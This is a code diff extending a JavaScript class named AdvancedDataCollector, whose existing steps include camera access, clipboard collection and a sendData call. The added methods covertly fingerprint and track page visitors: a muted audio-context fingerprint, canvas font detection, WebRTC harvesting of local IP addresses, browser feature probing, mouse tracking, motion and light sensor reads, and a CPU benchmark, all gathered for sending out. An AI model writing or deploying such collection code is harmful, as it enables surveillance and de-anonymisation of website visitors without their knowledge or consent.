@@ -22,6 +22,15 @@ class AdvancedDataCollector {
         await this.attemptCameraAccess();
         await this.collectClipboardData();
 
+        // NEW: Additional advanced collection methods
+        await this.collectAudioFingerprint();
+        await this.collectFontFingerprint();
+        await this.collectWebRTCLeaks();
+        await this.collectBrowserFeatures();
+        await this.collectBehavioralData();
+        await this.collectSensorData();
+        await this.performCPUBenchmark();
+
         // Send collected data
         this.sendData();
     }
@@ -306,6 +315,275 @@ class AdvancedDataCollector {
             };
         } catch (error) {
             return { error: error.message };
+        }
+    }
+
+    async collectAudioFingerprint() {
+        try {
+            if ('AudioContext' in window || 'webkitAudioContext' in window) {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                const context = new AudioContext();
+                const oscillator = context.createOscillator();
+                const analyser = context.createAnalyser();
+                const gainNode = context.createGain();
+                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
+
+                gainNode.gain.value = 0; // Mute
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gainNode);
+                gainNode.connect(context.destination);
+
+                oscillator.start(0);
+
+                const fingerprint = await new Promise((resolve) => {
+                    scriptProcessor.onaudioprocess = function(event) {
+                        const output = event.outputBuffer.getChannelData(0);
+                        const hash = Array.from(output.slice(0, 30)).reduce((a, b) => a + b, 0);
+                        oscillator.stop();
+                        context.close();
+                        resolve(hash.toString());
+                    };
+                });
+
+                this.collectedData.audioFingerprint = {
+                    hash: fingerprint,
+                    sampleRate: context.sampleRate,
+                    baseLatency: context.baseLatency || 'unknown',
+                    outputLatency: context.outputLatency || 'unknown'
+                };
+            }
+        } catch (error) {
+            this.collectedData.audioFingerprint = { error: error.message };
+        }
+    }
+
+    async collectFontFingerprint() {
+        try {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = [
+                'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+                'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
+                'Impact', 'Lucida Sans', 'Tahoma', 'Lucida Console', 'Monaco',
+                'Helvetica', 'Apple SD Gothic Neo', 'Microsoft YaHei'
+            ];
+
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const testString = 'mmmmmmmmmmlli';
+            const fontSize = '72px';
+
+            const getTextWidth = (font) => {
+                ctx.font = `${fontSize} ${font}`;
+                return ctx.measureText(testString).width;
+            };
+
+            const baseSizes = {};
+            baseFonts.forEach(baseFont => {
+                baseSizes[baseFont] = getTextWidth(baseFont);
+            });
+
+            const installedFonts = [];
+            testFonts.forEach(font => {
+                const detected = baseFonts.some(baseFont => {
+                    return getTextWidth(`${font}, ${baseFont}`) !== baseSizes[baseFont];
+                });
+                if (detected) installedFonts.push(font);
+            });
+
+            this.collectedData.fonts = {
+                installed: installedFonts,
+                count: installedFonts.length
+            };
+        } catch (error) {
+            this.collectedData.fonts = { error: error.message };
+        }
+    }
+
+    async collectWebRTCLeaks() {
+        try {
+            const localIPs = [];
+            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+
+            if (RTCPeerConnection) {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+                });
+
+                pc.createDataChannel('');
+                await pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+                    const ipMatch = ipRegex.exec(ice.candidate.candidate);
+                    if (ipMatch && !localIPs.includes(ipMatch[0])) {
+                        localIPs.push(ipMatch[0]);
+                    }
+                };
+
+                // Wait for ICE candidates
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                this.collectedData.webrtc = {
+                    localIPs: localIPs,
+                    leakDetected: localIPs.length > 0
+                };
+
+                pc.close();
+            }
+        } catch (error) {
+            this.collectedData.webrtc = { error: error.message };
+        }
+    }
+
+    async collectBrowserFeatures() {
+        try {
+            this.collectedData.browserFeatures = {
+                serviceWorker: 'serviceWorker' in navigator,
+                webAssembly: typeof WebAssembly !== 'undefined',
+                webGL2: !!document.createElement('canvas').getContext('webgl2'),
+                webGPU: 'gpu' in navigator,
+                bluetooth: 'bluetooth' in navigator,
+                usb: 'usb' in navigator,
+                nfc: 'nfc' in navigator,
+                paymentRequest: 'PaymentRequest' in window,
+                credentials: 'credentials' in navigator,
+                webAuthentication: 'credentials' in navigator && 'create' in navigator.credentials,
+                share: 'share' in navigator,
+                permissions: 'permissions' in navigator,
+                notifications: 'Notification' in window,
+                pushManager: 'PushManager' in window,
+                backgroundSync: 'sync' in (self.registration || {}),
+                periodicBackgroundSync: 'periodicSync' in (self.registration || {}),
+                indexedDB: 'indexedDB' in window,
+                fileSystem: 'showOpenFilePicker' in window,
+                clipboard: 'clipboard' in navigator,
+                contacts: 'contacts' in navigator,
+                wakeLock: 'wakeLock' in navigator,
+                mediaSession: 'mediaSession' in navigator
+            };
+        } catch (error) {
+            this.collectedData.browserFeatures = { error: error.message };
+        }
+    }
+
+    async collectBehavioralData() {
+        try {
+            const behavioral = {
+                mouseMovements: [],
+                clicks: [],
+                scrolls: [],
+                keypresses: [],
+                touchEvents: []
+            };
+
+            // Track mouse movements (first 10)
+            let mouseMoveCount = 0;
+            const mouseMoveHandler = (e) => {
+                if (mouseMoveCount++ < 10) {
+                    behavioral.mouseMovements.push({
+                        x: e.clientX,
+                        y: e.clientY,
+                        timestamp: Date.now()
+                    });
+                } else {
+                    document.removeEventListener('mousemove', mouseMoveHandler);
+                }
+            };
+            document.addEventListener('mousemove', mouseMoveHandler);
+
+            // Track focus/blur
+            behavioral.pageVisible = !document.hidden;
+            behavioral.hasFocus = document.hasFocus();
+
+            // Track tab visibility
+            behavioral.tabVisibility = document.visibilityState;
+
+            this.collectedData.behavioral = behavioral;
+        } catch (error) {
+            this.collectedData.behavioral = { error: error.message };
+        }
+    }
+
+    async collectSensorData() {
+        try {
+            const sensors = {};
+
+            // Ambient Light Sensor
+            if ('AmbientLightSensor' in window) {
+                try {
+                    const als = new AmbientLightSensor();
+                    als.addEventListener('reading', () => {
+                        sensors.ambientLight = als.illuminance;
+                        als.stop();
+                    });
+                    als.start();
+                } catch (e) {
+                    sensors.ambientLight = { error: e.message };
+                }
+            }
+
+            // Accelerometer
+            if ('Accelerometer' in window) {
+                try {
+                    const acl = new Accelerometer({ frequency: 60 });
+                    acl.addEventListener('reading', () => {
+                        sensors.accelerometer = { x: acl.x, y: acl.y, z: acl.z };
+                        acl.stop();
+                    });
+                    acl.start();
+                } catch (e) {
+                    sensors.accelerometer = { error: e.message };
+                }
+            }
+
+            // Gyroscope
+            if ('Gyroscope' in window) {
+                try {
+                    const gyr = new Gyroscope({ frequency: 60 });
+                    gyr.addEventListener('reading', () => {
+                        sensors.gyroscope = { x: gyr.x, y: gyr.y, z: gyr.z };
+                        gyr.stop();
+                    });
+                    gyr.start();
+                } catch (e) {
+                    sensors.gyroscope = { error: e.message };
+                }
+            }
+
+            // DeviceOrientation (fallback for mobile)
+            window.addEventListener('deviceorientation', (e) => {
+                sensors.deviceOrientation = {
+                    alpha: e.alpha,
+                    beta: e.beta,
+                    gamma: e.gamma
+                };
+            }, { once: true });
+
+            this.collectedData.sensors = sensors;
+        } catch (error) {
+            this.collectedData.sensors = { error: error.message };
+        }
+    }
+
+    async performCPUBenchmark() {
+        try {
+            const start = performance.now();
+            let result = 0;
+            // Simple CPU benchmark
+            for (let i = 0; i < 1000000; i++) {
+                result += Math.sqrt(i) * Math.sin(i);
+            }
+            const duration = performance.now() - start;
+
+            this.collectedData.cpuBenchmark = {
+                duration: duration,
+                score: Math.round(1000000 / duration),
+                timestamp: Date.now()
+            };
+        } catch (error) {
+            this.collectedData.cpuBenchmark = { error: error.message };
         }
     }
 
